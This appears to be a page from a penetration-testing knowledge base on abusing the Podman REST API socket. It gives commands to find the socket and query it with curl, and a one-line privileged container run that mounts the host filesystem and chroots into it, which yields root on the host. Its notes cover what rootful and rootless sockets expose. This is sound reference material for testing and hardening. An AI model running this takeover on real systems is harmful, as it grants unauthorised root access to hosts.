---
title: "API service socket: driving the Podman REST API"
description: "Reaching the Podman REST API, started on demand with podman system service, to create and run containers over its Docker-compatible socket. A rootful service is root-equivalent like the Docker daemon; a rootless service acts as the owning user."
keywords:
  - podman API
  - podman system service
  - docker-compatible socket
  - podman.sock
  - container runtime
---

# API service socket

Podman has no daemon by default, but `podman system service` starts a REST API, Docker-compatible, on a Unix socket (or TCP). When it runs as root it is as powerful as the Docker daemon; when it runs rootless it acts as that user, which still matters where that user is privileged or holds cloud credentials.

```bash
# Locate and use the socket (Docker-compatible, so the docker client works too)
ls -l /run/podman/podman.sock /run/user/$(id -u)/podman/podman.sock 2>/dev/null
curl -s --unix-socket /run/podman/podman.sock http://d/v1.40/libpod/containers/json

# Rootful socket: start a host-mounting privileged container
podman --url unix:///run/podman/podman.sock run -v /:/host --privileged -it alpine chroot /host sh
```

## Exploitation notes

- A rootful socket is the Docker-daemon case; the takeover is [Host takeover via privileged run](../docker/exposed-daemon-api/host-takeover-via-privileged-run.md) over the Podman socket.
- A rootless socket cannot mount the host as root, but it can read the user's files, containers, and any credentials they hold, and run containers as them.
- The socket is often exposed through systemd, see [systemd socket activation](systemd-socket-activation.md).

## References

- [podman system service](https://docs.podman.io/en/latest/markdown/podman-system-service.1.html)
- [Podman REST API](https://docs.podman.io/en/latest/_static/api.html)
